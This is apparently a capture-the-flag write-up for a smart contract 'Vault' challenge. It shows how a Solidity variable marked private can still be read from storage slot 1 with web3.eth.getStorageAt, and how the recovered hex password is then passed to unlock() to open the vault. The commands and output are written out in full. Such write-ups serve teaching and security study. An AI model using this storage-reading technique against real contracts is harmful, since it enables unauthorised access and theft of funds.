Idea is to call Vault.unlock() with a _password value that is the same as that of the state variable password. Although this state variable is declared private - meaning other contracts do not have access to it - it's still publicly accessible. We can read its value from the memory storage of this deployed contract with the correct index, which is 1 in this case since password is the second state variable.

contract instance: 0x42087bc27b67ad672ad48e34938a159d8e407d40

>web3.eth.getStorageAt("0x42087bc27b67ad672ad48e34938a159d8e407d40", 1, (err, data) => {
	rs=data.toString();
})
<undefined
>rs
<"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"

Now we know the password and can unlock the vault with it:

await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

To verify vault has been unlocked:
>await contract.locked()
<false

